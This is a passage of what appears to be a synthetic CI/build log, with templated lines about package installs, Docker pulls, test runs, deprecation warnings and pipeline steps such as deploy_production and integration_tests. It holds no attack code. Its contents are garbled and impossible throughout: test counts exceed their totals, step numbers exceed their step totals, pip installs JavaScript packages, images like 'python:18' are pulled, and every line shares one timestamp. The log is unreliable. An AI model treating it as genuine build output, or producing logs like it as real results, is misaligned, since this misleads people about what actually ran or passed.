migrations\nPlatform: darwin-arm64\nException: TypeError\n[12:47:21] INFO: Connecting to database\n[12:47:21] INFO: Processing request\nException: NullPointerException\nFetching from https://githubusercontent.com/package.json\nGenerating source maps...\nSwitched to branch 'feature/task-258'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling utils/handler.rs...\nSuccess!\nEnvironment: test\nOK\nPOST /upload - 202 (345ms)\nCache hit for key-2475\n[12:47:21] INFO: Processing request\nRan 172 tests in 9s\nyarn add: Done in 21.54s\nCache invalidated: node_modules\nImage pulled successfully\nSuccess!\nEnvironment: production\nConnection established\nRan 169 tests in 55s\n[12:47:21] WARN: Deprecated API usage\nVerifying...\nStep 15/24: Linting\nCompiling utils/service.java...\nTime: 86.834s\nPulling image: python:18\nBundling main.js\nFAILED: test_api_health\nProcessing...\nnpm install: resolved 193 packages\n  PASS: unit/test_api_health.spec.js\nCoverage: 82% statements, 90% branches\n[12:47:21] INFO: Processing request\n  PASS: test_user_create (354ms)\nnpm notice: created a lockfile\nNODE_ENV=production\nPlatform: win32-x64\n\u2713 deploy completed\n[12:47:21] INFO: Processing request\nRan 177 tests in 53s\nRan 153 tests in 45s\nStep 13/17: Deploying\nWARNING: lodash has known vulnerabilities\n  PASS: test_auth_login (309ms)\nInstalling jest@1.15.5\nPulling image: python:3.11\nTest Suites: 46 passed, 31 total\nPushing to registry...\nLayer 7/12: COPY command\npip: Installing build dependencies...\nStep 19/22: Installing dependencies\nTests: 398 passed, 363 total\nImage pulled successfully\nStep 4/15: Building\nyarn add: Done in 22.12s\n[12:47:21] WARN: Deprecated API usage\nCompiling components/index.js...\n\u2713 Task completed in 413ms\nDone.\nCompiling src/utils.go...\n[12:47:21] DEBUG: Connection pool: 20 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\nStep 17/23: Installing dependencies\nBuilding Docker image...\nSwitched to branch 'bugfix/task-271'\nSnapshots: 44 passed, 15 total\nFAILED: test_user_create\nWARNING: lodash has known vulnerabilities\nCompiling components/index.js...\nSnapshots: 2 passed, 17 total\nPOST /upload - 201 (453ms)\n[12:47:21] INFO: Cache refreshed\nOK\nnpm notice: created a lockfile\nCompiling components/handler.rs...\nSwitched to branch 'hotfix/task-947'\npip: Installing build dependencies...\nTest Suites: 48 passed, 35 total\n[12:47:21] INFO: Processing request\nBundling main.js\nImage pulled successfully\nArtifact uploaded: build.tar.gz (36MB)\nBuilding Docker image...\nStep 3/21: Deploying\npip: Installing build dependencies...\n\u2717 build failed with exit code 78\npip: Downloading express-5.16.tar.gz\nStep 15/20: Testing\nCompiling components/handler.rs...\nnpm notice: created a lockfile\nCache restored successfully (26MB)\nArtifact downloaded: 4MB\n[12:47:21] DEBUG: Connection pool: 2 active\n\u2713 Step 'checkout' succeeded\nFAILED: test_user_create\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\n[12:47:21] INFO: Request completed\npip: Collecting jest\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/20: Installing dependencies\n\u2713 Step 'test' succeeded\nLoading...\nConnection established\nUsing Node.js 19.16.0\nSnapshots: 35 passed, 15 total\nArtifact downloaded: 47MB\nLayer 4/11: RUN command\nCompiling components/app.ts...\nNODE_ENV=development\n[12:47:21] INFO: Cache refreshed\nCache restored successfully (218MB)\nChecking out master branch\npip: Downloading eslint-4.12.tar.gz\nPlatform: darwin-arm64\nUsing Python 3.11\nnpm install: added 88 packages\nCompiling components/service.java...\nAlready up to date.\nCompleted.\n[12:47:21] DEBUG: Memory usage: 320MB\nFetching from https://pypi.org/package.json\n[12:47:21] WARN: Deprecated API usage\nLoading...\n[12:47:21] INFO: Processing request\n[12:47:21] INFO: Request completed\nnpm install: resolved 1245 packages\nWARNING: lodash has known vulnerabilities\nArtifact downloaded: 13MB\nCoverage: 82% statements, 96% branches\n\u2713 Step 'setup' succeeded\nVerifying...\nStep 7/24: Linting\nTime: 51.126s\npip: Collecting axios\nNODE_ENV=production\nEnvironment: staging\nWARNING: react has known vulnerabilities\nCompiling components/service.java...\nWARNING: jest has known vulnerabilities\nLayer 6/14: COPY command\nCache saved successfully\nCache restored successfully (486MB)\nPushing to registry...\n  PASS: e2e/test_auth_login.spec.js\nTests: 354 passed, 240 total\n[12:47:21] DEBUG: Memory usage: 711MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: added 433 packages\nWARNING: prettier has known vulnerabilities\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] INFO: Processing request\nTest Suites: 35 passed, 20 total\nUploading artifact 'coverage' (20 files)\nCache hit for key-6610\nPulling image: python:18\nPlatform: darwin-arm64\nReady.\nStep 2/22: Linting\nWaiting...\n\u2713 Task completed in 2375ms\nnpm install: added 451 packages\n=== Step deploy_staging completed ===\n=== Step: deploy_production ===\nCache restored successfully (114MB)\nTests: 347 passed, 66 total\nStep 11/18: Testing\npip: Collecting lodash\nnpm notice: created a lockfile\nPulling image: python:3.11\nCache miss for key-6252\nArtifact uploaded: dist.zip (20MB)\nUsing Python 3.10\nCompiling components/index.js...\n[12:47:21] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2610\nAlready up to date.\nWARNING: jest has known vulnerabilities\nnpm install: resolved 557 packages\nCompleted.\n[12:47:21] INFO: Cache refreshed\nArtifact uploaded: dist.zip (31MB)\nRan 167 tests in 33s\nHEAD is now at 1ea21cc\n\u2713 Step 'install' succeeded\nSnapshots: 23 passed, 21 total\n\u2717 build failed with exit code 116\nWARNING: lodash has known vulnerabilities\n\u2713 All checks passed\nCoverage: 81% statements, 72% branches\nCache miss for key-8565\nTests: 134 passed, 321 total\n[12:47:21] DEBUG: Initializing service\nWARNING: lodash has known vulnerabilities\nLayer 9/13: RUN command\nCompiling utils/index.js...\n  PASS: test_db_connect (215ms)\nnpm install: resolved 671 packages\n[12:47:21] DEBUG: Query executed in 83ms\nCompiling components/utils.go...\nTime: 32.384s\nyarn add: Done in 13.33s\n[12:47:21] WARN: Deprecated API usage\n  PASS: test_auth_login (290ms)\nWaiting...\nPOST /upload - 200 (440ms)\n\u2713 All checks passed\n[12:47:21] DEBUG: Initializing service\nSnapshots: 49 passed, 10 total\nSnapshots: 46 passed, 42 total\n[12:47:21] INFO: Starting build process\nTLS handshake completed\nTest Suites: 13 passed, 23 total\nnpm notice: package.json updated\nPulling image: alpine:18\n[12:47:21] INFO: Request completed\nAlready up to date.\nLoading...\nPulling image: python:3.11\n[12:47:21] DEBUG: Connection pool: 8 active\nArtifact downloaded: 33MB\nCache invalidated: build\nStep 10/21: Linting\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: dist.zip (29MB)\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] ERROR: Connection failed\nOK\nSwitched to branch 'hotfix/task-289'\n[12:47:21] INFO: Starting build process\nnpm install: added 161 packages\n\u2713 Task completed in 4672ms\n[12:47:21] INFO: Request completed\nLayer 6/8: ENV command\nLoading...\nCache invalidated: dependencies\npip: Installing build dependencies...\nNODE_ENV=test\nSuccess!\nInstalling express@4.14.5\n[12:47:21] INFO: Request completed\nPulling image: python:3.11\nArtifact uploaded: build.tar.gz (37MB)\nCompiling utils/service.java...\n[12:47:21] DEBUG: Loading configuration\nStep 1/20: Installing dependencies\nBundling main.js\npip: Collecting react\nCache restored successfully (30MB)\nyarn add: Done in 23.40s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling utils/app.ts...\nCompiling src/service.java...\nLoading...\nOptimizing 39 modules...\n\u2713 build completed\nFetching submodules...\nWARNING: prettier has known vulnerabilities\nCompleted.\n[12:47:21] DEBUG: Query executed in 32ms\nLoading...\nInstalling prettier@5.18.5\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 7/9: COPY command\nCreating production build...\nLoading...\n[12:47:21] DEBUG: Memory usage: 1901MB\nProcessing...\nPlatform: win32-x64\nArtifact uploaded: dist.zip (77MB)\nLoading...\nBundling vendor.css\n\u2713 All checks passed\nImage pulled successfully\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: axios has known vulnerabilities\nCompleted.\nCoverage: 72% statements, 60% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nCompleted.\nArtifact uploaded: build.tar.gz (28MB)\nAlready up to date.\nFinished.\nGenerating source maps...\nnpm notice: created a lockfile\nTLS handshake completed\nArtifact uploaded: build.tar.gz (48MB)\npip: Collecting lodash\nTime: 95.421s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nStep 14/15: Running migrations\nVerifying...\nWARNING: prettier has known vulnerabilities\nCache saved successfully\n[12:47:21] DEBUG: Query executed in 27ms\nStep 16/17: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching from https://googleapis.com/package.json\nCache restored successfully (465MB)\nyarn add: Done in 2.70s\nImage pulled successfully\nTime: 34.231s\n[12:47:21] INFO: Connecting to database\nHEAD is now at f9e9dc5\nArtifact uploaded: build.tar.gz (40MB)\nCache restored successfully (271MB)\nCreating production build...\nRan 67 tests in 26s\nSuccess!\nArtifact uploaded: dist.zip (96MB)\nVerifying...\nBundling main.css\nStep 18/15: Linting\nCreating production build...\nSwitched to branch 'hotfix/task-905'\nUsing Node.js 17.14.3\n[12:47:21] INFO: Processing request\nUsing Node.js 19.9.0\n[12:47:21] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nUsing Python 3.9\npip: Collecting eslint\nLayer 1/8: ENV command\n[12:47:21] INFO: Cache refreshed\npip install: Successfully installed webpack-2.20\nConnection established\n[12:47:21] DEBUG: Initializing service\nImage pulled successfully\nNODE_ENV=development\npip: Collecting react\nArtifact uploaded: dist.zip (55MB)\nTests: 216 passed, 345 total\nCache hit for key-7659\nTime: 22.781s\npip: Installing build dependencies...\n[12:47:21] DEBUG: Loading configuration\n\u2713 validate completed\nCache hit for key-9070\nFinished.\nEnvironment: production\nTest Suites: 37 passed, 18 total\nCache invalidated: dependencies\n[12:47:21] DEBUG: Query executed in 18ms\n\u2713 Step 'test' succeeded\nCompleted.\nnpm install: resolved 1983 packages\nArtifact downloaded: 23MB\npip: Downloading react-1.11.tar.gz\nCompiling src/main.py...\npip: Installing build dependencies...\nUploading artifact 'coverage' (29 files)\n[12:47:21] DEBUG: Loading configuration\nnpm install: added 208 packages\nWARNING: lodash has known vulnerabilities\nCompiling lib/app.ts...\nWARNING: eslint has known vulnerabilities\nProcessing...\n[12:47:21] INFO: Processing request\npip: Downloading eslint-1.10.tar.gz\n\u2713 Step 'install' succeeded\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nnpm install: added 140 packages\n[12:47:21] INFO: Cache refreshed\npip: Installing build dependencies...\nArtifact downloaded: 34MB\nUploading artifact 'build' (1 files)\nnpm notice: package.json updated\nAlready up to date.\nCache hit for key-4775\nNODE_ENV=test\nFetching submodules...\nLoading...\n\u2713 test completed\nGenerating source maps...\nCompiling lib/service.java...\nChecking out master branch\nInstalling lodash@3.13.6\n\u2713 Step 'test' succeeded\nOptimizing 59 modules...\n[12:47:21] WARN: Deprecated API usage\nSuccess!\n[12:47:21] DEBUG: Initializing service\nArtifact uploaded: dist.zip (73MB)\nStep 7/19: Testing\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 100% statements, 78% branches\nCompiling src/utils.go...\npip: Installing build dependencies...\nNODE_ENV=development\nAlready up to date.\nWARNING: prettier has known vulnerabilities\nCache saved successfully\nWaiting...\nImage pulled successfully\nLayer 8/15: ENV command\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling lib/handler.rs...\n[12:47:21] DEBUG: Loading configuration\n=== Step deploy_production completed ===\n=== Step: restore_cache ===\nArtifact downloaded: 23MB\nCache hit for key-3481\nBuilding Docker image...\n\u2713 lint completed\nArtifact uploaded: dist.zip (57MB)\nDone.\nNODE_ENV=production\nLayer 4/11: RUN command\nCompiling lib/app.ts...\nBundling runtime.css\nStep 12/18: Building\nCompiling components/handler.rs...\nArtifact downloaded: 9MB\nPulling image: alpine:18\nTransforming 569 files...\nCache invalidated: build\nSuccess!\nCompiling utils/handler.rs...\n\u2717 build failed with exit code 119\nBuilding Docker image...\nWARNING: axios has known vulnerabilities\nUsing Node.js 15.10.1\nImage pulled successfully\nPulling image: python:latest\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBundling styles.css\nRan 36 tests in 43s\nException: RuntimeError\nBundling styles.js\nHEAD is now at 43134c2\nChecking out master branch\nStep 8/21: Testing\nFetching from https://npmjs.org/package.json\nNODE_ENV=development\nCompleted.\n\u2713 Task completed in 707ms\nyarn add: Done in 1.38s\nnpm install: resolved 143 packages\nTransforming 699 files...\nLayer 8/13: COPY command\nInstalling react@5.3.3\nCompiling lib/service.java...\nHEAD is now at 80641a8\n[12:47:21] INFO: Request completed\nTests: 281 passed, 400 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 3/25: Testing\nFinished.\nCreating production build...\n[12:47:21] INFO: Request completed\n  PASS: test_db_connect (386ms)\npip: Downloading react-1.9.tar.gz\nHEAD is now at dbe595e\nWARNING: prettier has known vulnerabilities\nCompiling components/utils.go...\n[12:47:21] WARN: Deprecated API usage\nChecking out main branch\nArtifact downloaded: 21MB\npip: Downloading axios-5.12.tar.gz\nCache saved successfully\nFetching submodules...\nCompiling utils/handler.rs...\nArtifact uploaded: build.tar.gz (10MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:21] INFO: Connecting to database\nUsing Python 3.12\n\u2713 package completed\nCache restored successfully (141MB)\n[12:47:21] DEBUG: Initializing service\nCache saved successfully\nVerifying...\nStep 7/23: Building\n\u2713 Step 'setup' succeeded\nFetching from https://gcr.io/package.json\nTLS handshake completed\nPushing to registry...\n[12:47:21] DEBUG: Connection pool: 18 active\nStep 16/21: Deploying\nAlready up to date.\npip: Collecting express\n[12:47:21] INFO: Request completed\nPlatform: win32-x64\nTests: 314 passed, 202 total\nLoading...\n[12:47:21] WARN: Deprecated API usage\n  PASS: unit/test_user_create.spec.js\nnpm install: resolved 126 packages\nProcessing...\nCoverage: 73% statements, 83% branches\nLoading...\n[12:47:21] INFO: Processing request\n  PASS: test_db_connect (394ms)\nProcessing...\nWARNING: react has known vulnerabilities\nStep 6/24: Testing\nMinifying vendor.js\n[12:47:21] DEBUG: Loading configuration\nWARNING: express has known vulnerabilities\nnpm notice: created a lockfile\nUploading artifact 'coverage' (20 files)\nImage pulled successfully\nStep 4/25: Linting\nStep 19/21: Deploying\nCache saved successfully\nFinished.\n[12:47:21] INFO: Connecting to database\nLayer 2/15: RUN command\nOptimizing 13 modules...\nFetching from https://docker.io/package.json\n[12:47:21] DEBUG: Memory usage: 980MB\nnpm notice: created a lockfile\npip: Collecting jest\nFinished.\nPlatform: linux-x64\nArtifact downloaded: 38MB\nPOST /data - 202 (196ms)\nCompiling components/app.ts...\n[12:47:21] DEBUG: Connection pool: 3 active\n[12:47:21] DEBUG: Initializing service\nPlatform: darwin-arm64\nOptimizing 97 modules...\nLayer 4/11: ENV command\nArtifact downloaded: 32MB\n[12:47:21] DEBUG: Memory usage: 1007MB\n\u2713 deploy completed\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 lint completed\nStep 2/20: Running migrations\nStep 8/21: Linting\n[12:47:21] DEBUG: Memory usage: 620MB\nWaiting...\n[12:47:21] DEBUG: Initializing service\nDone.\nStep 3/15: Deploying\nLoading...\nGET /api - 204 (62ms)\n  PASS: test_auth_login (353ms)\nyarn add: Done in 20.53s\nFetching submodules...\nFetching from https://pypi.org/package.json\nCompiling lib/service.java...\nWARNING: axios has known vulnerabilities\npip install: Successfully installed express-4.12\nPushing to registry...\n[12:47:21] ERROR: Connection failed\nBuilding Docker image...\nConnection established\nTest Suites: 39 passed, 49 total\n  PASS: test_api_health (133ms)\nOptimizing 45 modules...\nFinished.\nChecking out main branch\nTime: 46.972s\nTime: 108.580s\nUsing Python 3.11\n[12:47:21] INFO: Cache refreshed\nCompleted.\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] INFO: Processing request\nUsing Python 3.11\n  PASS: test_api_health (474ms)\n  PASS: integration/test_api_health.spec.js\n[12:47:21] INFO: Request completed\n[12:47:21] DEBUG: Memory usage: 1084MB\n  PASS: test_db_connect (178ms)\n[12:47:21] INFO: Connecting to database\nCompleted.\nSnapshots: 25 passed, 6 total\nPlatform: win32-x64\nCreating production build...\n\u2713 Task completed in 3849ms\nWARNING: lodash has known vulnerabilities\nCreating production build...\nProcessing...\npip install: Successfully installed prettier-3.3\nEnvironment: staging\nStep 10/15: Linting\nTest Suites: 25 passed, 35 total\n[12:47:21] INFO: Request completed\npip: Downloading eslint-4.6.tar.gz\nTests: 394 passed, 68 total\nStep 4/25: Building\n  PASS: integration/test_api_health.spec.js\nUploading artifact 'dist' (36 files)\n[12:47:21] DEBUG: Loading configuration\n[12:47:21] DEBUG: Initializing service\n[12:47:21] WARN: Deprecated API usage\nFetching submodules...\nChecking out develop branch\nyarn add: Done in 16.99s\nStep 11/17: Building\n\u2713 Step 'setup' succeeded\nFAILED: test_db_connect\nyarn add: Done in 14.74s\npip: Downloading express-2.14.tar.gz\nCache hit for key-3114\n\u2717 build failed with exit code 127\n[12:47:21] DEBUG: Memory usage: 1027MB\n[12:47:21] INFO: Starting build process\nWARNING: express has known vulnerabilities\nStep 15/25: Building\nTests: 179 passed, 468 total\n[12:47:21] ERROR: Connection failed\nCompiling lib/handler.rs...\nCompiling lib/handler.rs...\n[12:47:21] WARN: Deprecated API usage\nStep 12/19: Building\nWaiting...\n\u2713 Task completed in 3762ms\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\nOK\nNODE_ENV=test\nSnapshots: 21 passed, 20 total\nPOST /data - 202 (239ms)\nOK\nCache restored successfully (151MB)\nSuccess!\n[12:47:21] INFO: Processing request\nPulling image: alpine:3.11\nSnapshots: 42 passed, 47 total\nRan 74 tests in 52s\nProcessing...\nMinifying vendor.js\nTransforming 416 files...\n[12:47:21] INFO: Processing request\nUploading artifact 'build' (50 files)\nPulling image: alpine:latest\npip: Downloading express-1.19.tar.gz\nCache hit for key-8526\nyarn add: Done in 30.21s\n[12:47:21] WARN: Deprecated API usage\nRan 82 tests in 52s\nNODE_ENV=test\nStep 20/24: Building\nWARNING: webpack has known vulnerabilities\nnpm install: added 403 packages\nOK\nStep 8/25: Installing dependencies\nPushing to registry...\nCache invalidated: dependencies\n=== Step restore_cache completed ===\n=== Step: integration_tests ===\nConnection established\npip: Downloading express-1.12.tar.gz\nCache hit for key-5730\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] INFO: Cache refreshed\nWARNING: express has known vulnerabilities\nFinished.\nPulling image: node:18\n[12:47:21] DEBUG: Connection pool: 11 active\nPulling image: alpine:3.11\nLayer 9/13: COPY command\nStep 7/21: Installing dependencies\nOK\nUsing Node.js 14.18.1\nnpm install: added 199 packages\n\u2713 build completed\n[12:47:21] INFO: Connecting to database\nFetching submodules...\nVerifying...\nStep 6/20: Linting\n[12:47:21] WARN: Deprecated API usage\n[12:47:21] WARN: Deprecated API usage\nPlatform: win32-x64\n\u2713 Step 'checkout' succeeded\nImage pulled successfully\nSnapshots: 8 passed, 44 total\n[12:47:21] DEBUG: Memory usage: 1884MB\nFinished.\n[12:47:21] INFO: Connecting to database\nOK\nGET /status - 204 (64ms)\nStep 8/25: Running migrations\n\u2713 All checks passed\n  PASS: test_db_connect (263ms)\n  PASS: test_api_health (461ms)\n  PASS: test_auth_login (122ms)\nCache hit for key-4883\n[12:47:21] DEBUG: Loading configuration\nNODE_ENV=test\nSuccess!\nVerifying...\nCache saved successfully\nCompleted.\nTime: 57.333s\n[12:47:21] INFO: Processing request\n[12:47:21] WARN: Deprecated API usage\nPushing to registry...\nyarn add: Done in 24.24s\nEnvironment: development\n\u2713 Step 'test' succeeded\n[12:47:21] DEBUG: Connection pool: 10 active\nDone.\npip: Installing build dependencies...\nPulling image: node:3.11\nCache invalidated: node_modules\nSwitched to branch 'bugfix/task-557'\n[12:47:21] INFO: Request completed\nProcessing...\nEnvironment: development\nFAILED: test_auth_login\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:21] DEBUG: Loading configuration\nLayer 7/13: RUN command\nCoverage: 95% statements, 68% branches\nTests: 265 passed, 71 total\nCompiling utils/main.py...\nEnvironment: development\nImage pulled successfully\nFetching submodules...\nTest Suites: 25 passed, 38 total\nTest Suites: 12 passed, 27 total\n\u2717 build failed with exit code 44\nWaiting...\nUploading artifact 'dist' (26 files)\nWARNING: express has known vulnerabilities\nStep 6/17: Deploying\nCompiling lib/handler.rs...\n[12:47:21] ERROR: Connection failed\nTransforming 929 files...\nWARNING: jest has known vulnerabilities\nBundling vendor.css\nUsing Python 3.9\n\u2713 Task completed in 3724ms\nAlready up to date.\nFetching from https://docker.io/package.json\n[12:47:21] INFO: Connecting to database\nReady.\n\u2713 Step 'install' succeeded\nnpm notice: created a lockfile\nTime: 64.622s\nArtifact downloaded: 3MB\nCache restored successfully (495MB)\n\u2713 Step 'checkout' succeeded\nCreating production build...\nCompiling src/utils.go...\nStep 17/17: Deploying\nConnection established\nGenerating source maps...\nTransforming 160 files...\nCoverage: 81% statements, 80% branches\nOK\nnpm notice: created a lockfile\nStep 17/19: Installing dependencies\n\u2713 deploy completed\nSnapshots: 46 passed, 5 total\n[12:47:21] DEBUG: Loading configuration\nHEAD is now at 3567262\nLayer 9/10: ENV command\nyarn add: Done in 30.91s\n[12:47:21] DEBUG: Memory usage: 959MB\nCompiling src/handler.rs...\nUsing Python 3.10\nCompiling utils/main.py...\nPulling image: alpine:latest\nStep 20/19: Deploying\nSwitched to branch 'feature/task-827'\nStep 17/20: Testing\nStep 6/16: Building\n[12:47:21] DEBUG: Loading configuration\n[12:47:21] WARN: Deprecated API usage\nStep 11/22: Building\nCompiling lib/app.ts...\nCache invalidated: dependencies\nSwitched to branch 'hotfix/task-443'\nFetching submodules...\nWARNING: jest has known vulnerabilities\nEnvironment: development\nCache invalidated: build\nStep 13/18: Testing\nAlready up to date.\n[12:47:21] DEBUG: Query executed in 91ms\nConnection established\nGenerating source maps...\nHEAD is now at a3bb691\nStep 11/19: Deploying\nSnapshots: 41 passed, 11 total\n[12:47:21] WARN: Deprecated API usage\nStep 12/15: Deploying\nSwitched to branch 'bugfix/task-217'\nCompleted.\nCache restored successfully (431MB)\nNODE_ENV=production\nConnection established\nWARNING: eslint has known vulnerabilities\n[12:47:21] INFO: Starting build process\n[12:47:21] INFO: Request completed\nnpm install: resolved 1330 packages\nCompiling src/app.ts...\nWaiting...\nTests: 216 passed, 62 total\nStep 10/19: Testing\nSwitched to branch 'feature/task-769'\npip: Downloading jest-5.18.tar.gz\nStep 17/16: Testing\nReady.\nException: TypeError\nStep 7/18: Testing\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nAlready up to date.\nOptimizing 41 modules...\nUsing Node.js 17.16.8\nTime: 110.116s\n\u2713 Step 'checkout' succeeded\n[12:47:21] DEBUG: Memory usage: 574MB\n[12:47:21] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nPulling image: python:latest\nSuccess!\n[12:47:21] WARN: Deprecated API usage\nCompiling src/index.js...\n  PASS: test_auth_login (29ms)\nEnvironment: production\n[12:47:21] INFO: Starting build process\nPlatform: linux-x64\nCache hit for key-6408\nUsing Python 3.10\n[12:47:21] INFO: Request completed\n[12:47:21] DEBUG: Memory usage: 535MB\n[12:47:21] DEBUG: Loading configuration\nWaiting...\nyarn add: Done in 1.99s\nCompiling utils/main.py...\nChecking out main branch\n\u2713 All checks passed\nFetching submodules...\nBundling main.js\nReady.\nFetching submodules...\nBuilding Docker image...\nWaiting...\nWARNING: express has known vulnerabilities\nTLS handshake completed\nFetching submodules...\nCache hit for key-3723\nCompiling lib/index.js...\nFetching from https://docker.io/package.json\nnpm install: added 497 packages\nPushing to registry...\nnpm install: resolved 885 packages\nBundling vendor.css\nBuilding Docker image...\npip: Collecting lodash\nConnection established\nPulling image: node:latest\n[12:47:21] INFO: Request completed\nGenerating source maps...\nStep 10/23: Testing\npip: Collecting prettier\n  PASS: e2e/test_cache_hit.spec.js\nUsing Node.js 14.1.0\nFetching from https://docker.io/package.json\n[12:47:21] DEBUG: Loading configuration\nGenerating source maps...\nBundling main.css\nMinifying main.js\nStep 4/25: Linting\nnpm install: resolved 1956 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'build' succeeded\n[12:47:21] DEBUG: Query executed in 13ms\n  PASS: unit/test_db_connect.spec.js\nUploading artifact 'coverage' (30 files)\nVerifying...\nTLS handshake completed\n[12:47:21] INFO: Processing request\nStep 13/24: Installing dependencies\nReady.\n\u2713 package completed\nWaiting...\n[12:47:21] DEBUG: Loading configuration\nLayer 9/11: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:21] ERROR: Connection failed\nCompiling utils/index.js...\nOptimizing 76 modules...\nHEAD is now at 0f092e8\nAlready up to date.\nOK\nStep 18/18: Running migrations\n[12:47:21] INFO: Starting build process\nStep 4/16: Installing dependencies\n=== Step integration_tests completed ===\n=== Step: e2e_tests ===\nLayer 5/11: RUN command\n[12:47:21] INFO: Request completed\nOK\nNODE_ENV=test\nTime: 11.311s\nAlready up to date.\nnpm notice: package.json updated\nStep 1/18: Testing\nCompiling src/app.ts...\nReady.\nDone.\nHEAD is now at 0bb01ee\n[12:47:21] INFO: Processing request\nArtifact downloaded: 36MB\nReady.\nAlready up to date.\n[12:47:21] WARN: Deprecated API usage\nTests: 52 passed, 397 total\nTime: 114.266s\nOK\nSnapshots: 39 passed, 24 total\nFAILED: test_auth_login\nCache saved successfully\nDone.\nEnvironment: production\nBundling main.css\nCompiling utils/app.ts...\npip install: Successfully installed webpack-3.19\nWARNING: lodash has known vulnerabilities\n[12:47:21] DEBUG: Query executed in 44ms\npip install: Successfully installed eslint-1.0\nTime: 40.25s\nHEAD is now at 5014da2\nTests: 114 passed, 304 total\nEnvironment: production\n\u2713 Task completed in 4204ms\nStep 19/18: Testing\nAlready up to date.\nTest Suites: 40 passed, 43 total\nTests: 184 passed, 215 total\n[12:47:21] INFO: Connecting to database\nWARNING: lodash has known vulnerabilities\nConnection established\nAlready up to date.\nUsing Python 3.12\nOK\n\u2713 build completed\n[12:47:21] DEBUG: Query executed in 40ms\nNODE_ENV=development\nTime: 104.284s\nArtifact uploaded: dist.zip (67MB)\n\u2713 All checks passed\nBuilding Docker image...\nReady.\nGET /status - 201 (22ms)\n[12:47:21] DEBUG: Query executed in 55ms\nTest Suites: 30 passed, 7 total\nArtifact uploaded: build.tar.gz (12MB)\nOptimizing 60 modules...\nDone.\nUploading artifact 'dist' (4 files)\nTest Suites: 44 passed, 17 total\nReady.\nLoading...\nnpm notice: created a lockfile\n[12:47:21] INFO: Request completed\nStep 20/19: Linting\nConnection established\nnpm notice: package.json updated\nStep 17/16: Linting\nStep 3/25: Running migrations\nCompleted.\n[12:47:21] INFO: Starting build process\nArtifact downloaded: 48MB\nnpm notice: created a lockfile\nPulling image: python:3.11\nInstalling webpack@2.7.1\nMinifying vendor.js\nGenerating source maps...\nTime: 110.318s\nTime: 114.398s\nGET /status - 200 (95ms)\nFetching from https://registry.npmjs.org/package.json\n[12:47:21] INFO: Processing request\n[12:47:21] WARN: Deprecated API usage\nCache miss for key-9929\nArtifact uploaded: dist.zip (57MB)\nBuilding Docker image...\nCompiling src/utils.go...\nVerifying...\nLoading...\nStep 3/16: Linting\nTime: 112.685s\nnpm notice: package.json updated\nBundling styles.js\nSwitched to branch 'feature/task-145'\n\u2713 All checks passed\nChecking out master branch\nHEAD is now at 75f235e\n\u2713 Task completed in 3357ms\n[12:47:21] DEBUG: Connection pool: 14 active\n  PASS: test_db_connect (125ms)\nWaiting...\nFetching submodules...\nWARNING: webpack has known vulnerabilities\npip: Downloading react-5.7.tar.gz\n[12:47:21] DEBUG: Memory usage: 1990MB\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 8/19: Linting\nArtifact uploaded: build.tar.gz (10MB)\nnpm install: resolved 1199 packages\n[12:47:21] INFO: Request completed\nOK\nSuccess!\nStep 9/16: Testing\nFinished.\nSuccess!\nBundling runtime.js\n[12:47:21] DEBUG: Initializing service\n[12:47:21] DEBUG: Initializing service\n[12:47:21] DEBUG: Initializing service\nCache miss for key-4739\nTLS handshake completed\nDone.\nTLS handshake completed\nTime: 7.28s\n\u2713 Step 'install' succeeded\nUsing Python 3.10\nSuccess!\n[12:47:21] DEBUG: Connection pool: 15 active\n[12:47:21] INFO: Cache refreshed\n[12:47:21] INFO: Starting build process\n\u2717 build failed with exit code 31\nTime: 71.390s\nnpm install: resolved 998 packages\nOptimizing 49 modules...\nPOST /api - 201 (148ms)\nAlready up to date.\nWARNING: eslint has known vulnerabilities\nCompiling utils/utils.go...\nnpm install: added 123 packages\n[12:47:21] DEBUG: Loading configuration\n\u2717 build failed with exit code 3\nLayer 5/8: COPY command\n[12:47:21] WARN: Deprecated API usage\nStep 12/16: Building\nOK\nFinished.\nTransforming 845 files...\nPOST /data - 201 (417ms)\nStep 6/17: Building\nCompiling lib/utils.go...\n[12:47:21] DEBUG: Loading configuration\nVerifying...\nGenerating source maps...\nCache restored successfully (362MB)\npip: Installing build dependencies...\nException: RuntimeError\nWARNING: webpack has known vulnerabilities\nCompiling components/app.ts...\npip: Collecting lodash\nCreating production build...\n\u2713 Task completed in 